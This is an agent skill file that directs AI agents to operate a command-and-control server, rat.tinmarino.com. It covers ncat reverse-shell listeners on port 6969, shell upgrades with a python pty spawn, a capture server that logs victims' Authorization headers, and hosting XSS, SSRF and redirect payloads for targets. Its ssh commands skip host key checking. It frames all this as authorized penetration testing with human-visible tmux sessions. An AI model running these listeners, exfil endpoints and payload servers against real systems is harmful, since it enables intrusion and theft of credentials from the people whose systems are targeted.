---
name: rat-c2-tmux
description: 'Drives the operator''s own C2/redirector host rat.tinmarino.com ("Rat") during AUTHORIZED engagements: starts listeners, catches reverse shells, and serves payload pages on port 6969 through a human-visible tmux window, falling back to one-shot `ssh rat`. Triggers on "usa mi alias rat", "abre el C&C", "el pane Rat", "catch the reverse shell", "levanta el listener en rat", "sirve esta pagina al blanco", or when a PoC needs an external callback, exfil endpoint, or attacker-controlled URL.'
source: own-tooling
license: MIT
metadata:
  audience: opencode-agents
---

# Rat C2 over Tmux

`Rat` is Tinmarino's own AWS box (`rat.tinmarino.com`, user `ubuntu`, key `~/Secret/aws-key-ciberlab-ctf.pem`). It is the external endpoint for authorized engagements: OAST/SSRF callbacks, exfil capture, payload hosting, and reverse-shell catching.

Two channels exist and they are not interchangeable:

| Channel | Use it for | Cost |
| --- | --- | --- |
| `ssh rat '<cmd>'` one-shot | setup, file drops, reading logs, `ss -ltnp`, anything non-interactive | ~350 ms per command, new shell each time |
| tmux window `Rat` | a **live** interactive session: a listener waiting, or a caught reverse shell you must type into | ~60 ms per command, and the human sees everything |

A caught reverse shell only exists inside the process that caught it. `ssh rat 'nc -lvnp 6969'` from an agent is a dead end: the shell dies with the tool call. That is the entire reason the tmux channel exists.

## Authorization gate

Before touching Rat for anything that generates traffic toward a client system, confirm the engagement authorization is on record in the conversation or the project notes. Reverse shells and live C2 from production are intrusive; if the finding is already conclusively proven by non-interactive means, say so and do not stand up a live backdoor just for completeness.

## Preconditions

```bash
ssh -o BatchMode=yes rat 'hostname; ss -ltnp | head'
```

Key-based `ssh rat` works via `~/.ssh/config` (`Host rat`). The operator's shell alias is:

```bash
alias rat='tmux rename-window Rat; ssh -i ~/Secret/aws-key-ciberlab-ctf.pem -o StrictHostKeyChecking=no ubuntu@rat.tinmarino.com'
```

## Resolve the pane by NAME, never by index

This is the rule that matters most. Window indices shift when the operator opens or closes windows, and `send-keys -t 6:6` into a stale index has injected keystrokes into an unrelated Claude session. Always resolve:

```bash
tmux list-panes -a -F '#{session_name}:#{window_index}.#{pane_index} #{window_name} #{pane_current_command}' \
  | grep -iE ' Rat[0-9]? '
```

Use the resolved `session:window.pane` for exactly one burst of commands, then re-resolve. With several agents in parallel, each agent owns one numbered window: `Rat`, `Rat2`, `Rat3`. Never send keys into a window you did not resolve as yours.

If no `Rat` window exists, create your own rather than borrowing one:

```bash
tmux new-window -d -n Rat2 "ssh -o StrictHostKeyChecking=no rat"
```

## The send / capture loop

```bash
PANE=$(tmux list-panes -a -F '#{session_name}:#{window_index}.#{pane_index} #{window_name}' | awk '$2=="Rat"{print $1; exit}')
MARK="__done_$$__"
tmux send-keys -t "$PANE" "id; hostname; echo $MARK" Enter
# poll until the marker shows up, then read the block
tmux capture-pane -p -t "$PANE" | tail -40
```

Rules for the loop:

- Always append a unique end marker (`echo __done_NNN__`) and poll `capture-pane` until it appears. Without a marker you cannot tell "still running" from "empty output".
- Poll with a short sleep (100–200 ms) and a hard timeout; do not busy-loop, and do not assume the first capture is the final state.
- `capture-pane -p` returns the whole visible pane, not your command's output. Slice from your own echoed command line to the marker.
- Send one command per `send-keys`. Quote the payload so the local shell does not expand it; prefer a heredoc-free single line, or `send-keys -l` for literal text plus a separate `Enter`.
- A raw caught reverse shell has no prompt and no job control. Do not send `Ctrl-C` — it kills the shell, not the remote command. Upgrade first:

  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # then, in the caught shell: export TERM=xterm; stty rows 50 cols 200
  ```

- Never send `exit` into the operator's pane, and never kill a window you did not create.

## Port 6969 is the canonical port

**Use 6969 for everything: listening on Rat and sending from the client side.** It is verified open inbound in the AWS Security Group and free of other services. Do not pick a random port per engagement — the operator watches 6969, and a callback on another port may be silently dropped by the SG.

Port 80 also works but has a resident service (`capture_server.py` pattern) and needs `sudo`. Ports 22 and 25 are taken. Always check before binding:

```bash
ssh rat "ss -ltn '( sport = :6969 )'"
```

Reverse-shell catcher, in the tmux pane so it stays alive:

```bash
tmux send-keys -t "$PANE" 'ncat -lvnp 6969 --keep-open' Enter
```

HTTP callback / exfil capture — `~/capture_server.py` on the box is the reusable pattern (logs `Authorization`, `User-Agent`, path, and returns a minimal valid JPEG so the victim's image pipeline does not error out). Adapt it per engagement rather than writing a new one:

```bash
ssh rat 'sudo python3 capture_server.py'   # in the Rat pane if you need to watch hits live
```

For a blind SSRF/OAST check, a unique path per attempt is the proof: `http://rat.tinmarino.com:6969/ssrf-poc-<random>`. Then confirm the hit in the capture server output — an unconfirmed callback is not evidence, and you must report it as unconfirmed.

## Rendezvous point: serving pages to a target

The same port is the place to **serve** content to a target, not only to receive from it. Useful whenever the target's browser, server, or pipeline must fetch something you control: SSRF fetch targets, XSS/CSP payload delivery, `<script src>` hosting, OAuth/OIDC redirect landing pages, SSRF-to-metadata redirect chains, an update manifest, or a plain file drop.

Interactive one-shot, when you want to see the exact request in the pane:

```bash
tmux send-keys -t "$PANE" 'printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<h1>hi</h1>" | ncat -lvnp 6969' Enter
```

Omit `Content-Length` on a `Connection: close` response, or compute it with `wc -c` — a hardcoded length that is off by one silently truncates the body at the client.

For several fetches, or when the target needs real files, serve a directory instead:

```bash
ssh rat 'mkdir -p ~/www/<engagement> && cd ~/www/<engagement> && python3 -m http.server 6969 --bind 0.0.0.0'
```

Run that in the Rat pane when you need the access log live; `ssh rat` one-shot only works if you background it and read the log later.

When the response body itself matters to keep the target's chain alive, reuse `~/capture_server.py`: it logs `Authorization`, `User-Agent`, and path, and returns a minimal valid JPEG so the victim's image pipeline does not error out. Adapt it per engagement rather than writing a new one.

The public URL to hand to the target is:

```text
http://rat.tinmarino.com:6969/<unique-poc-path>
```

Keep the path unique per PoC so each hit is attributable, and serve only what the finding needs — this is a public box.

## Hygiene

- One unique path per PoC on port 6969, so every hit is attributable. Vary the path, not the port.
- Record the exact payload, the timestamp, and the captured request in the finding.
- Tear down listeners when the test ends; leave no orphan `ncat` on a public box.
- Do not leave client secrets sitting in `~` on Rat longer than the engagement needs; the capture output belongs in the project's evidence folder.

## Related

- `persistent-terminal-control` — the PTY driver, faster than tmux (43 ms vs 60 ms mean) but invisible to the human. Prefer tmux for C2 work precisely because the operator must be able to see and seize the shell.
